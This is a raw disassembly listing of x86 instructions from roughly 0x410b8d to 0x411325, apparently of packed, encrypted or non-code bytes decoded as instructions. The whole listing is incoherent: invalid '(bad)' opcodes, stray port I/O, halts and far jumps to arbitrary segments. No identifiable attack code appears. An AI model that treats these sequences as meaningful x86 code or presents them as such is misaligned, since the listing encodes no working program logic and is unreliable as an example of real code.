  410b8d:	and    al,BYTE PTR [ecx+ecx*2-0x20689996]
  410b94:	xchg   edi,eax
  410b95:	cmc    
  410b96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b97:	mov    ss,WORD PTR [ecx+0x2236efb3]
  410b9d:	adc    DWORD PTR [eax],eax
  410b9f:	sbb    BYTE PTR [ebp-0x57],bl
  410ba2:	scas   eax,DWORD PTR es:[edi]
  410ba3:	xor    dl,0x65
  410ba6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ba7:	shl    DWORD PTR [ecx-0x44],1
  410baa:	das    
  410bab:	aaa    
  410bac:	les    eax,FWORD PTR [ebp*2+0x5e89ed68]
  410bb3:	sbb    DWORD PTR [ebx+0x11689acf],ecx
  410bb9:	jnp    0x410b43
  410bbb:	or     cl,ah
  410bbd:	fstp   QWORD PTR [ecx-0x2c941b20]
  410bc3:	and    BYTE PTR [ebp-0x161e52b1],0xfe
  410bca:	dec    ebx
  410bcb:	rol    DWORD PTR [edx+eax*1+0x46],0xfc
  410bd0:	sahf   
  410bd1:	mov    ebx,0xde0f3c93
  410bd6:	cmp    bh,BYTE PTR [ecx+0x54]
  410bd9:	xchg   esi,eax
  410bda:	inc    eax
  410bdb:	sub    DWORD PTR [edx],ecx
  410bdd:	xchg   edi,eax
  410bde:	scas   eax,DWORD PTR es:[edi]
  410bdf:	imul   eax,DWORD PTR [edx-0x16],0xa2cf3d23
  410be6:	pop    ss
  410be7:	adc    al,0x2d
  410be9:	in     eax,dx
  410bea:	sub    BYTE PTR [esi-0x5d],ch
  410bed:	push   es
  410bee:	and    eax,0x69b1878f
  410bf3:	and    DWORD PTR [esi+0x6a248a1b],edi
  410bf9:	mov    ebp,0x8719211d
  410bfe:	xor    al,BYTE PTR [esi+0x9081f6e]
  410c04:	in     eax,dx
  410c05:	aam    0xb3
  410c07:	or     al,0x3e
  410c09:	cdq    
  410c0a:	sub    dh,0xdf
  410c0d:	enter  0x650b,0x49
  410c11:	aad    0xe1
  410c13:	inc    ebp
  410c14:	daa    
  410c15:	(bad)  
  410c17:	shl    DWORD PTR [esi+0x46],1
  410c1a:	je     0x410c60
  410c1c:	popf   
  410c1d:	(bad)  
  410c1e:	out    0xe,al
  410c20:	xlat   BYTE PTR ds:[ebx]
  410c21:	xlat   BYTE PTR ds:[ebx]
  410c22:	pop    es
  410c23:	fwait
  410c24:	adc    bl,0x60
  410c27:	inc    esi
  410c28:	push   cs
  410c29:	xor    al,0x51
  410c2b:	(bad)
  410c2f:	pop    edx
  410c30:	push   eax
  410c31:	mov    al,ds:0xde8933b2
  410c36:	sbb    ebx,ecx
  410c38:	cwde   
  410c39:	in     al,dx
  410c3a:	outs   dx,DWORD PTR ds:[esi]
  410c3b:	mov    ebp,0x346b098d
  410c40:	xor    al,0x4c
  410c43:	test   BYTE PTR [esi+0x41ac0d75],cl
  410c49:	jne    0x410c25
  410c4b:	js     0x410c6c
  410c4d:	dec    edi
  410c4e:	or     al,0x10
  410c50:	pop    edi
  410c51:	dec    eax
  410c52:	fcmovnb st,st(7)
  410c54:	sahf   
  410c55:	push   DWORD PTR [esi+0x7d]
  410c58:	mov    cl,0x77
  410c5a:	or     al,0x7e
  410c5c:	adc    dh,ch
  410c5e:	inc    ah
  410c60:	cmp    ch,al
  410c62:	leave  
  410c63:	xchg   edi,eax
  410c64:	les    ecx,FWORD PTR [eax+0x1e]
  410c67:	bound  edi,QWORD PTR [ebp+esi*8-0x71]
  410c6b:	enter  0xd806,0x82
  410c6f:	xchg   edi,eax
  410c70:	es (bad) 
  410c72:	fucomp st(3)
  410c74:	jo     0x410c9c
  410c76:	adc    DWORD PTR [ecx],0x2a98229c
  410c7c:	jbe    0x410cac
  410c7e:	sbb    al,0x9f
  410c80:	inc    esp
  410c81:	mov    cl,0xe4
  410c83:	rcl    bl,1
  410c85:	push   ecx
  410c86:	stos   BYTE PTR es:[edi],al
  410c87:	xchg   ebx,eax
  410c88:	pop    ss
  410c89:	scas   al,BYTE PTR es:[edi]
  410c8a:	mov    WORD PTR [edi-0xe],?
  410c8d:	stc    
  410c8e:	mov    al,0x99
  410c90:	mov    esp,0x44f38bf0
  410c95:	inc    edx
  410c96:	xchg   edx,eax
  410c97:	(bad)  
  410c99:	mov    edx,0x468111a1
  410c9e:	dec    edx
  410c9f:	xor    al,0xb5
  410ca1:	lea    ebx,[ecx+0x1c8b9067]
  410ca7:	clc    
  410ca8:	sbb    BYTE PTR [ecx+0x6327526b],bh
  410cae:	dec    eax
  410caf:	mov    ds:0x33fb79fa,al
  410cb4:	xchg   ecx,eax
  410cb5:	(bad)  
  410cb6:	(bad)  
  410cb7:	(bad)  
  410cb8:	out    0x6f,al
  410cba:	push   edx
  410cbb:	inc    edi
  410cbc:	aaa    
  410cbd:	push   edi
  410cbe:	sti    
  410cbf:	adc    BYTE PTR [ebp+edi*8+0x637908f1],0xea
  410cc7:	jnp    0x410d09
  410cc9:	fsubr  st,st(3)
  410ccb:	hlt    
  410ccc:	jp     0x410c94
  410cce:	shr    DWORD PTR [ecx],0xdf
  410cd1:	mov    ebx,0xc6b7f32e
  410cd6:	cmp    edx,esi
  410cd8:	nop
  410cd9:	in     eax,0x17
  410cdb:	jae    0x410d52
  410cdd:	(bad)  
  410cde:	daa    
  410cdf:	cwde   
  410ce0:	mov    dh,0xa0
  410ce2:	aas    
  410ce3:	cmc    
  410ce4:	cmp    edx,DWORD PTR [esi-0x4d]
  410ce7:	shl    BYTE PTR [edx],1
  410ce9:	pushf  
  410cea:	xchg   DWORD PTR [esi-0x6cef706b],ecx
  410cf0:	or     DWORD PTR [ebx],edx
  410cf2:	mov    dh,0x86
  410cf4:	lds    edx,FWORD PTR [ecx]
  410cf6:	jecxz  0x410d56
  410cf8:	dec    esi
  410cf9:	adc    al,0xe6
  410cfb:	dec    esi
  410cfc:	inc    eax
  410cfd:	sbb    al,0x16
  410cff:	jo     0x410c82
  410d01:	mov    eax,ds:0xb1faf145
  410d06:	push   0xddd9269a
  410d0b:	xchg   BYTE PTR [edx],ch
  410d0d:	rcr    edi,cl
  410d0f:	jns    0x410d20
  410d11:	xor    dl,al
  410d13:	jmp    0x49a4:0xc3e74f
  410d1a:	cwde   
  410d1b:	imul   ebx,DWORD PTR [edx-0x63],0x63
  410d1f:	aaa    
  410d20:	mov    ds:0xfbe2fa78,al
  410d25:	out    0x2f,eax
  410d27:	popa   
  410d28:	pop    ebp
  410d29:	in     al,0xdd
  410d2b:	mov    al,ds:0xeebc4bae
  410d30:	adc    al,0x7
  410d32:	push   es
  410d33:	jmp    0xab123a14
  410d38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d39:	das    
  410d3a:	sub    eax,0xf33e4706
  410d3f:	or     BYTE PTR [edi],al
  410d41:	pop    eax
  410d42:	mul    esp
  410d44:	xlat   BYTE PTR ds:[ebx]
  410d45:	mov    eax,ds:0x2d9414c2
  410d4a:	sbb    al,0xab
  410d4c:	dec    ebx
  410d4d:	aaa    
  410d4e:	xor    BYTE PTR [eax-0x6f842bae],al
  410d54:	xor    BYTE PTR [ebp+0x5c2045bd],bh
  410d5a:	push   ebx
  410d5b:	fwait
  410d5c:	dec    ebp
  410d5d:	or     esp,DWORD PTR cs:[esi+0x41]
  410d61:	stos   BYTE PTR es:[edi],al
  410d62:	mov    esi,DWORD PTR [edi-0x67]
  410d65:	lahf   
  410d66:	xchg   edi,eax
  410d67:	imul   edx,DWORD PTR [ebp+0x12],0x3d
  410d6b:	(bad)  [esi+0x72b84a50]
  410d71:	sub    eax,0xda6691df
  410d76:	cmc    
  410d77:	xchg   esi,eax
  410d78:	jl     0x410de2
  410d7a:	xchg   BYTE PTR [eax-0x6dc56f6e],ah
  410d80:	pop    ebx
  410d81:	icebp  
  410d82:	(bad)  
  410d83:	jnp    0x410d80
  410d85:	push   edx
  410d86:	in     al,dx
  410d87:	pop    edi
  410d88:	mov    dh,0xbc
  410d8a:	out    0x1,al
  410d8c:	(bad)  
  410d8d:	fstp   QWORD PTR [esi-0x3e4f643c]
  410d93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d94:	aaa    
  410d95:	leave  
  410d96:	addr16 inc esi
  410d98:	pop    esi
  410d99:	cli    
  410d9a:	daa    
  410d9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d9c:	mov    cl,0x5b
  410d9e:	or     esp,DWORD PTR [ebx-0x12fef39a]
  410da4:	cld    
  410da5:	adc    eax,0x861d4a66
  410daa:	sbb    al,0x72
  410dac:	mov    dh,0x77
  410dae:	push   cs
  410daf:	ret    
  410db0:	or     eax,0xbb0c393e
  410db5:	mov    edx,0xcf628d41
  410dba:	mov    WORD PTR [eax-0x19e156d3],gs
  410dc0:	lods   al,BYTE PTR ds:[esi]
  410dc1:	psubusb mm7,QWORD PTR [esi+ebx*2-0x12d155ef]
  410dc9:	sbb    BYTE PTR [edi+0x6185387b],0xa3
  410dd0:	aam    0x5d
  410dd2:	jb     0x410d9e
  410dd4:	pop    eax
  410dd5:	add    al,0x31
  410dd7:	int    0x6a
  410dd9:	in     eax,0xba
  410ddb:	mov    eax,ds:0xb5878664
  410de0:	data16 sti 
  410de2:	pop    ecx
  410de3:	and    bh,ah
  410de5:	test   eax,0x8558b8b
  410dea:	jmp    0x4111de
  410def:	inc    edi
  410df0:	cli    
  410df1:	fisttp DWORD PTR [edx+0x517569e1]
  410df7:	jp     0x410dcf
  410df9:	xchg   ecx,eax
  410dfa:	mov    edx,0xdbfad324
  410dff:	mov    esp,0x497070b8
  410e04:	jge    0x410e76
  410e06:	jo     0x410e07
  410e08:	jno    0x410e43
  410e0a:	into   
  410e0b:	sti    
  410e0c:	test   eax,0xb2200483
  410e11:	lods   eax,DWORD PTR ds:[esi]
  410e12:	and    eax,0xbe179926
  410e17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e18:	adc    al,0x4a
  410e1a:	dec    edx
  410e1b:	jmp    0x410e57
  410e1d:	xor    al,0x57
  410e1f:	and    esp,DWORD PTR ss:[edi+0x47f81830]
  410e26:	and    eax,0x3fb05b00
  410e2b:	inc    eax
  410e2c:	dec    edi
  410e2d:	dec    esp
  410e2e:	mov    esp,0x43e5a81
  410e33:	or     esi,DWORD PTR [ebp-0x3b]
  410e36:	gs int 0xc6
  410e39:	les    ebp,FWORD PTR ds:0x5c3dd1ff
  410e3f:	retf   
  410e40:	dec    esp
  410e41:	xchg   ebp,eax
  410e42:	adc    BYTE PTR [edx-0x270786f8],bl
  410e48:	fwait
  410e49:	aam    0xc4
  410e4b:	shl    DWORD PTR [ecx-0x7f],0x75
  410e4f:	(bad)  
  410e50:	imul   esi,DWORD PTR [eax-0x5ed8b728],0xffffffe6
  410e57:	add    BYTE PTR [edx-0x1d],bl
  410e5a:	inc    ecx
  410e5b:	sub    al,BYTE PTR [ebp-0x45]
  410e5e:	in     eax,0x64
  410e60:	test   al,0x61
  410e62:	inc    edx
  410e63:	sbb    al,0x14
  410e65:	push   esp
  410e66:	mov    ecx,0x7bbaa0b9
  410e6b:	push   ebp
  410e6c:	lock jge 0x410dfb
  410e6f:	outs   dx,DWORD PTR es:[esi]
  410e71:	outs   dx,DWORD PTR ds:[esi]
  410e72:	ud1    edi,esp
  410e75:	int3   
  410e76:	(bad)  
  410e77:	fstp   QWORD PTR [ebp+eiz*4+0x4a]
  410e7b:	or     ebp,edx
  410e7d:	push   ds
  410e7e:	loope  0x410e4a
  410e80:	jmp    DWORD PTR [edi]
  410e82:	arpl   WORD PTR [edi-0x66],cx
  410e85:	mov    ds:0xe41c36a7,al
  410e8a:	dec    ebx
  410e8b:	in     al,dx
  410e8c:	add    bl,BYTE PTR [eax+0x27]
  410e8f:	outs   dx,DWORD PTR ds:[esi]
  410e90:	sub    BYTE PTR [edx-0x36c6b5b8],al
  410e96:	add    al,BYTE PTR [ecx+0x5486abab]
  410e9c:	rcr    ch,1
  410e9e:	add    BYTE PTR [ecx+ebp*1+0x646405c4],0xb3
  410ea6:	add    esi,edx
  410ea8:	xchg   ecx,eax
  410ea9:	out    0xc0,eax
  410eab:	mov    dl,0xc7
  410ead:	sub    al,BYTE PTR [edx+0x690ac580]
  410eb3:	(bad)  
  410eb4:	lea    edx,[eax+0x5a472dd]
  410eba:	dec    esp
  410ebb:	add    eax,ecx
  410ebd:	mov    WORD PTR [edx],gs
  410ebf:	xor    al,0x4c
  410ec1:	mov    dh,dl
  410ec3:	sub    BYTE PTR [eax],dl
  410ec5:	add    BYTE PTR [ecx-0x50bb9a01],0xd9
  410ecc:	sbb    esi,DWORD PTR [esi-0x4451654a]
  410ed2:	lahf   
  410ed3:	mov    al,0xf
  410ed5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ed6:	ja     0x410f39
  410ed8:	mov    ah,dh
  410eda:	pop    es
  410edb:	std    
  410edc:	mov    dh,0xff
  410ede:	xchg   edx,eax
  410edf:	inc    ebp
  410ee0:	mov    BYTE PTR [ebx+0x49ec569],al
  410ee6:	xor    esp,DWORD PTR [eax+0x172dd93a]
  410eec:	lea    esi,ds:0x8ea56035
  410ef2:	fsub   st,st(3)
  410ef4:	pop    edi
  410ef5:	cmp    al,0x4d
  410ef7:	fstp   st(6)
  410ef9:	dec    edi
  410efa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410efb:	sbb    BYTE PTR [ebx+ebp*2+0x57],0xdf
  410f00:	add    BYTE PTR [eax],ah
  410f02:	pop    esi
  410f03:	inc    edi
  410f04:	pushf  
  410f05:	push   DWORD PTR [esi]
  410f07:	or     BYTE PTR ds:0xfd797732,al
  410f0d:	xchg   edx,eax
  410f0e:	or     BYTE PTR [ebx-0x5bd821e5],al
  410f14:	sub    eax,0x914b8628
  410f19:	cmp    bh,BYTE PTR [edi]
  410f1b:	cmp    eax,0xb2644021
  410f20:	xor    ah,BYTE PTR [edx-0x5f7f6cf5]
  410f26:	icebp  
  410f27:	pop    esp
  410f28:	pop    esp
  410f29:	xor    BYTE PTR [eax+0x5cecee41],bh
  410f2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f30:	xor    eax,0xb0708e97
  410f35:	pop    DWORD PTR [edi-0x7af67dc0]
  410f3b:	jle    0x410f6d
  410f3d:	jecxz  0x410fa1
  410f3f:	xor    BYTE PTR [ebx],0x7
  410f42:	das    
  410f43:	mov    al,ds:0xa3daa914
  410f48:	rcl    edi,0x10
  410f4b:	ins    DWORD PTR es:[edi],dx
  410f4c:	push   0x2794abef
  410f51:	repnz dec esi
  410f53:	sub    BYTE PTR [edi+0x42],0x6c
  410f57:	adc    esi,edi
  410f59:	out    0x4f,al
  410f5b:	jg     0x410f66
  410f5d:	sti    
  410f5e:	pusha  
  410f5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f60:	jns    0x410f11
  410f62:	push   ss
  410f63:	pop    ds
  410f64:	jl     0x410fcd
  410f66:	mov    dl,BYTE PTR [eax-0x30d5ae0b]
  410f6c:	inc    esp
  410f6d:	(bad)
  410f71:	fst    QWORD PTR [ecx]
  410f73:	or     al,0xba
  410f75:	dec    edx
  410f76:	or     eax,esp
  410f78:	mov    ch,0x27
  410f7a:	cwde   
  410f7b:	out    0x9f,al
  410f7d:	fs hlt 
  410f7f:	jne    0x410f11
  410f81:	inc    ebx
  410f82:	rcr    DWORD PTR [edx+0x2bac3abe],1
  410f88:	add    BYTE PTR [ecx-0x59f31752],ah
  410f8e:	xchg   edx,eax
  410f8f:	sub    ah,bh
  410f91:	arpl   WORD PTR [ebx-0x29495ea0],di
  410f97:	std    
  410f98:	lods   eax,DWORD PTR ds:[esi]
  410f99:	jmp    0xcf90bd30
  410f9e:	cmp    al,0x1e
  410fa0:	call   DWORD PTR [ecx+0x77]
  410fa3:	jns    0x410fb4
  410fa5:	je     0x410f40
  410fa7:	mov    al,0x13
  410fa9:	mov    dh,0xe
  410fab:	or     DWORD PTR [ebx],edx
  410fad:	out    0xd2,al
  410faf:	inc    esp
  410fb0:	cld    
  410fb1:	stos   DWORD PTR es:[edi],eax
  410fb2:	jno    0x410ff3
  410fb4:	mov    al,0x5a
  410fb6:	icebp  
  410fb7:	pop    eax
  410fb8:	push   ecx
  410fb9:	jnp    0x410fb1
  410fbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410fbc:	and    DWORD PTR [edi+esi*1],edi
  410fbf:	mov    ebp,0x886f3c53
  410fc4:	mov    ebp,0xa2f66b62
  410fc9:	or     eax,DWORD PTR ds:0x379613dc
  410fcf:	rcr    BYTE PTR [ebx+ecx*1+0x56],0xad
  410fd4:	inc    ecx
  410fd5:	mov    ah,0xc8
  410fd7:	out    dx,eax
  410fd8:	add    BYTE PTR [ecx-0x36b15d53],0x3d
  410fdf:	aas    
  410fe0:	dec    edi
  410fe1:	pop    edx
  410fe2:	out    dx,al
  410fe3:	cwde   
  410fe4:	jb     0x410fe6
  410fe6:	(bad)  
  410fe7:	jecxz  0x41103c
  410fe9:	out    dx,eax
  410fea:	pop    esi
  410feb:	mov    fs,WORD PTR [ebx]
  410fed:	sub    DWORD PTR [edx-0x48],edx
  410ff0:	aad    0xa5
  410ff2:	repnz mov cl,0x7
  410ff5:	es push ss
  410ff7:	sbb    bl,ch
  410ff9:	nop
  410ffa:	clc    
  410ffb:	call   0xc6dd:0xbd6989f5
  411002:	pushf  
  411003:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411004:	popa   
  411005:	or     eax,ebx
  411007:	rol    DWORD PTR [esi+edx*2-0x28acbfeb],1
  41100e:	cld    
  41100f:	xchg   ebx,eax
  411010:	mov    ds:0xd698230f,al
  411015:	push   ss
  411016:	ds ss scas al,BYTE PTR es:[edi]
  411019:	cs enter 0x7281,0xbc
  41101e:	daa    
  41101f:	mov    edi,0x82f06a46
  411024:	pop    DWORD PTR [edi]
  411026:	mov    esi,0x72f89ccd
  41102b:	sub    al,0xee
  41102d:	mov    bh,0x5e
  41102f:	cmp    eax,0x4957a637
  411034:	sbb    eax,ebx
  411036:	or     eax,0x8dd2f9f5
  41103b:	dec    esp
  41103c:	xchg   ebx,eax
  41103d:	sbb    eax,0x619472d4
  411042:	mov    bh,0xcb
  411044:	mov    bh,al
  411046:	(bad)  
  411047:	fld    QWORD PTR [ebx+ecx*1-0x1]
  41104b:	mov    ss,edi
  41104d:	inc    ecx
  41104e:	mov    bh,0x59
  411050:	pop    ebx
  411051:	ficom  WORD PTR [esp+edx*4+0x53]
  411055:	pop    ss
  411056:	ffree  st(7)
  411058:	out    0x4b,al
  41105a:	push   edx
  41105b:	sub    BYTE PTR [ecx-0x3c],0x95
  41105f:	or     DWORD PTR [ebx+0x7d],edx
  411062:	test   eax,0x18802af8
  411067:	push   ecx
  411068:	fpatan 
  41106a:	or     eax,0xe728217
  41106f:	jb     0x411056
  411071:	(bad)  
  411072:	ss push cs
  411074:	lahf   
  411075:	or     eax,0xc4de7009
  41107a:	add    BYTE PTR [ebp+0x5d8c3be8],0xf0
  411081:	gs xor eax,esp
  411084:	add    al,0x80
  411086:	pop    ebx
  411087:	(bad)  
  411089:	push   ebx
  41108a:	jae    0x4110b1
  41108c:	retf   
  41108d:	xchg   edi,eax
  41108e:	sbb    edx,DWORD PTR [ecx]
  411090:	push   cs
  411091:	dec    edi
  411092:	xchg   ecx,eax
  411093:	fld    QWORD PTR [edi]
  411095:	add    DWORD PTR [eax-0x7d],esi
  411098:	iret   
  411099:	stc    
  41109a:	enter  0x12,0xaf
  41109e:	cmp    cl,BYTE PTR [ebx+0x7c]
  4110a1:	xlat   BYTE PTR ds:[ebx]
  4110a2:	js     0x41104c
  4110a4:	or     DWORD PTR [edx+0x25],edi
  4110a7:	jnp    0x4110fe
  4110a9:	not    DWORD PTR [eax]
  4110ab:	out    0xd4,al
  4110ad:	xor    ebp,DWORD PTR [esi]
  4110af:	aam    0x80
  4110b1:	daa    
  4110b2:	dec    ebp
  4110b3:	sub    DWORD PTR [eax-0x35],edi
  4110b6:	outs   dx,DWORD PTR ds:[esi]
  4110b7:	adc    ecx,DWORD PTR [esi+eax*2-0x2a]
  4110bb:	xor    eax,0x93668c44
  4110c0:	pop    ebp
  4110c1:	or     bl,dl
  4110c3:	push   esp
  4110c4:	mov    BYTE PTR [esi],0xc2
  4110c7:	jle    0x4110b1
  4110c9:	pusha  
  4110ca:	cmc    
  4110cb:	fdiv   st(7),st
  4110cd:	in     al,0xce
  4110cf:	mov    bh,0x91
  4110d1:	cli    
  4110d2:	fdecstp 
  4110d4:	aas    
  4110d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110d6:	xchg   bh,al
  4110d8:	jo     0x4110c5
  4110da:	fnsave [edx]
  4110dc:	sub    al,0x5e
  4110de:	sbb    al,0x64
  4110e0:	adc    edx,DWORD PTR [ecx-0x50]
  4110e3:	push   es
  4110e4:	imul   ebp,ebp,0xffffffdc
  4110e7:	sub    eax,0x7fb477c
  4110ec:	aad    0x81
  4110ee:	iret   
  4110ef:	js     0x4110f9
  4110f1:	ins    DWORD PTR es:[edi],dx
  4110f2:	cmp    ch,bh
  4110f4:	sub    eax,0x4ef04da
  4110f9:	mov    ds:0x6e25f2e3,ax
  4110ff:	in     eax,0x34
  411101:	sub    edi,edx
  411103:	mov    ah,dh
  411105:	jns    0x4110ce
  411107:	mov    ebp,0x7d3b1bec
  41110c:	inc    ecx
  41110d:	mov    ah,0x20
  41110f:	(bad)  
  411111:	stos   DWORD PTR es:[edi],eax
  411112:	idiv   BYTE PTR [eax+0x51de627b]
  411118:	(bad)  
  411119:	sti    
  41111a:	or     DWORD PTR [edx],eax
  41111c:	cmp    al,0xa8
  41111e:	inc    edi
  41111f:	or     DWORD PTR [esi+0x2fb7501c],esp
  411125:	addr16 sbb cl,cl
  411128:	or     edx,edi
  41112a:	imul   ecx,DWORD PTR [eax+0x12e3d815],0xa4a6011
  411134:	shr    esp,1
  411136:	push   ebx
  411137:	repz das 
  411139:	js     0x411113
  41113b:	fwait
  41113c:	and    al,0x56
  41113e:	out    dx,eax
  41113f:	adc    ecx,0x37
  411142:	inc    ebp
  411143:	xchg   ebp,eax
  411144:	inc    esp
  411145:	shr    bl,cl
  411147:	push   0x5d
  411149:	fdivrp st(2),st
  41114b:	lods   al,BYTE PTR ds:[esi]
  41114c:	xor    eax,0x8210a8bb
  411151:	aam    0xaf
  411153:	jne    0x411158
  411155:	jl     0x411180
  411157:	push   ss
  411158:	pop    eax
  411159:	ror    DWORD PTR [edx-0x2c],1
  41115c:	and    al,0xe7
  41115e:	pushf  
  41115f:	(bad)  [esi]
  411161:	cdq    
  411162:	(bad)  
  411163:	cmp    bh,BYTE PTR [edi+0x77]
  411166:	out    0x85,al
  411168:	leave  
  411169:	ja     0x411156
  41116b:	mov    ch,0x6a
  41116d:	xchg   ebx,eax
  41116e:	dec    esp
  41116f:	add    al,0x42
  411171:	bound  esp,QWORD PTR [ebp-0x22]
  411174:	jle    0x4111f1
  411176:	jno    0x411109
  411178:	outs   dx,DWORD PTR ds:[esi]
  411179:	fwait
  41117a:	aaa    
  41117b:	sbb    DWORD PTR [ebp+esi*2-0x532f55f9],ecx
  411182:	fs ja  0x4111b8
  411185:	mov    al,0x5a
  411187:	fisub  WORD PTR [edi-0x59add103]
  41118d:	or     eax,0x2ede95a7
  411192:	adc    BYTE PTR [edx],ah
  411194:	aad    0xc5
  411196:	mov    al,ds:0x3ecd3ea1
  41119b:	push   ebp
  41119c:	js     0x411124
  41119e:	scas   al,BYTE PTR es:[edi]
  41119f:	cmc    
  4111a0:	jecxz  0x4111fa
  4111a2:	or     DWORD PTR [ecx+0x32],ecx
  4111a5:	cli    
  4111a6:	and    bh,BYTE PTR [esp+eiz*2+0x23e75a4c]
  4111ad:	inc    DWORD PTR [edx-0x49a4f464]
  4111b3:	test   eax,0x9588d512
  4111b8:	rcr    DWORD PTR [edx],1
  4111ba:	(bad)  
  4111bb:	push   DWORD PTR [ecx-0x6d2904f]
  4111c1:	sbb    al,BYTE PTR [ebp+eiz*8+0x4]
  4111c5:	pop    esi
  4111c6:	pop    eax
  4111c7:	adc    edi,DWORD PTR [esi]
  4111c9:	popa   
  4111ca:	repnz add DWORD PTR [edi+0x73f93ecb],eax
  4111d1:	cmp    al,0x8e
  4111d3:	dec    esp
  4111d4:	(bad)  
  4111d5:	sbb    al,0x81
  4111d7:	in     al,0x89
  4111d9:	and    BYTE PTR [ecx+0xe],ah
  4111dc:	cmc    
  4111dd:	outs   dx,DWORD PTR ds:[esi]
  4111de:	xor    eax,ecx
  4111e0:	lea    eax,[eax+edx*1+0x32729c]
  4111e7:	mov    DWORD PTR [ebp+0x8],eax
  4111ea:	mov    eax,DWORD PTR [ebp-0x18]
  4111ed:	jmp    0x4115e1
  4111f2:	mov    al,0x3c
  4111f4:	fwait
  4111f5:	xchg   ebx,eax
  4111f6:	fwait
  4111f7:	jae    0x411261
  4111f9:	rol    DWORD PTR [ebp+0x16435cff],cl
  4111ff:	xchg   DWORD PTR [ebp+0x7044950d],edi
  411205:	jo     0x411250
  411207:	jge    0x411279
  411209:	jo     0x4111a4
  41120b:	data16 sbb BYTE PTR [edx+edi*4-0x54668d43],bl
  411213:	ins    DWORD PTR es:[edi],dx
  411214:	xchg   esi,eax
  411215:	adc    BYTE PTR [edx+0x7d],ah
  411218:	inc    eax
  411219:	add    edi,DWORD PTR [ebp-0xcbd1b09]
  41121f:	es mov ah,0x5c
  411222:	push   eax
  411224:	jmp    0x4111ef
  411226:	mov    cl,0xee
  411228:	mov    ebx,0x64b22bf3
  41122d:	bound  ebx,QWORD PTR [ebx-0xfc3bed3]
  411233:	aaa    
  411234:	les    edx,FWORD PTR [edi+0x28f2d830]
  41123a:	arpl   di,cx
  41123c:	lds    eax,FWORD PTR [ebp-0x7b]
  41123f:	sbb    ch,dh
  411241:	xchg   DWORD PTR [edi-0x41],ecx
  411244:	push   0xe6934087
  411249:	mov    ah,0x1f
  41124b:	sbb    DWORD PTR [ecx],edx
  41124d:	les    ebx,FWORD PTR [ecx-0x2f]
  411250:	push   ebp
  411251:	push   ebx
  411252:	loopne 0x4111e8
  411254:	outs   dx,DWORD PTR ds:[esi]
  411255:	in     eax,dx
  411256:	cmp    al,BYTE PTR [bx+si]
  411259:	dec    edi
  41125a:	lods   al,BYTE PTR ds:[esi]
  41125b:	adc    al,0xa7
  41125d:	in     al,dx
  41125e:	cdq    
  41125f:	neg    DWORD PTR [ecx+esi*1]
  411262:	int    0xc7
  411264:	lock fld DWORD PTR [ecx]
  411267:	pop    edi
  411268:	daa    
  411269:	inc    ebp
  41126a:	leave  
  41126b:	inc    ecx
  41126c:	repz loopne 0x411256
  41126f:	rcr    esp,0x3c
  411272:	(bad)  
  411273:	jno    0x411239
  411275:	aas    
  411276:	mov    ch,0x4c
  411278:	push   ecx
  411279:	mov    bh,BYTE PTR [esi]
  41127b:	push   ss
  41127c:	dec    ecx
  41127d:	pop    esp
  41127e:	sbb    DWORD PTR [edx],ebp
  411280:	jns    0x4112af
  411282:	out    0x35,al
  411284:	cmp    bl,al
  411286:	stc    
  411287:	and    ecx,DWORD PTR [ebx]
  411289:	inc    esi
  41128a:	mov    BYTE PTR [esi-0x22],bh
  41128d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41128e:	stos   BYTE PTR es:[edi],al
  41128f:	ret    0x663a
  411292:	sbb    eax,0xae71c3bb
  411297:	mov    ebx,0x8fae47d1
  41129c:	mov    WORD PTR [ebp+0x7f9ee337],es
  4112a2:	inc    eax
  4112a3:	pusha  
  4112a4:	push   edx
  4112a5:	xor    ah,BYTE PTR [ecx]
  4112a7:	or     DWORD PTR [eax+0x33],edi
  4112aa:	or     dl,cl
  4112ac:	push   edi
  4112ad:	mov    al,ds:0xc521ba68
  4112b2:	and    BYTE PTR cs:[edx-0x3fc5bc16],bl
  4112b9:	add    al,0xfe
  4112bb:	adc    DWORD PTR [ebp+0x5dddbd1f],ebx
  4112c1:	cmp    al,0x38
  4112c3:	xor    DWORD PTR [ebx-0x10],ebx
  4112c6:	div    DWORD PTR [ebx-0x48fa0f9e]
  4112cc:	test   DWORD PTR [edi-0x46],esi
  4112cf:	dec    esp
  4112d0:	icebp  
  4112d1:	inc    edx
  4112d2:	rol    DWORD PTR [ebx+edi*4-0x7eb559a9],0x2d
  4112da:	std    
  4112db:	clc    
  4112dc:	rcl    BYTE PTR [edx-0x66326812],1
  4112e2:	outs   dx,DWORD PTR ds:[esi]
  4112e3:	xchg   esp,eax
  4112e4:	push   cs
  4112e5:	repz je 0x4112c1
  4112e8:	imul   esi,DWORD PTR [edi+edx*2+0x4],0xfffffffa
  4112ed:	xchg   ecx,eax
  4112ee:	sbb    eax,DWORD PTR [ebp-0x65]
  4112f1:	lea    esp,[edx+0x6f]
  4112f4:	pop    esi
  4112f5:	adc    ecx,DWORD PTR [ebx+0x4a]
  4112f8:	or     al,0x48
  4112fa:	pop    edi
  4112fb:	stos   DWORD PTR es:[edi],eax
  4112fc:	in     eax,dx
  4112fd:	jmp    0x6a5c:0xe16cb0f5
  411304:	jae    0x4112c9
  411306:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411307:	jns    0x41137c
  411309:	ja     0x41137b
  41130b:	dec    esi
  41130c:	inc    esi
  41130d:	add    eax,0xd69346b
  411312:	push   ebx
  411313:	je     0x4112b8
  411315:	imul   DWORD PTR [ecx-0x2f2320b1]
  41131b:	mov    dh,0xcc
  41131d:	into   
  41131e:	xchg   edi,eax
  41131f:	gs pop esp
  411321:	ror    BYTE PTR [esi+0x4e],0xc6
  411325:	mov    ebx,0xfc41d64b
